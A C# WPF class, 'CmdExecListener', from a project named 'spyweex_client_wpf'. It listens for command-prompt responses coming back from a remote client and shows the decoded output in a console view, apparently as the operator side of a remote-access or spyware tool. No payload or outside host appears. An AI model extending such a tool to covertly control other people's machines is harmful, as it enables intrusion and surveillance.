using System;
using System.Diagnostics;
using System.Reactive.Concurrency;
using System.Reactive.Linq;
using System.Text;
using System.Windows;

namespace spyweex_client_wpf.Subscribers
{
    public class CmdExecListener : ISubscriber
    {
        public void Subscribe(WxhtpClient wxhtpClient, ConsoleContent dc)
        {
            if (isSubscribed) return;
            isSubscribed = true;
            IDisposable idisp = wxhtpClient.GetAsyncTaskExecutor().
                getObservableSequenceOfReponses().
                ObserveOn(Scheduler.CurrentThread).
                SkipWhile(response => !response.Action.Equals(StaticStrings.ACTION_TYPE.COMMAND_PROMPT)).
                Subscribe(
                response =>
                {
                    Response resp = (Response)response;
                    string result;
                    if (resp.headers.ContainsKey("Encoding"))
                    {
                        Encoding enc = Encoding.GetEncoding(Int32.Parse(resp.headers["Encoding"]));
                        result = enc.GetString(resp.content);
                    }
                    else
                    {
                        result = resp.content.ToString();
                    }

                    dc.ConsoleOutput.Add(result);
                    UnsubscribeAsync();

                    //Dispatcher.CurrentDispatcher.BeginInvoke(new Action(() =>
                    //                                                    {

                    //                                                    }));
                },
                err =>
                {
                    Debug.WriteLine((Exception)err);
                    MessageBoxResult result = MessageBox.Show("Error occured in Command Promt Listener " + (Exception)err);
                    UnsubscribeAsync();
                }

           );
            subscriberToken = idisp;

        }
    }

}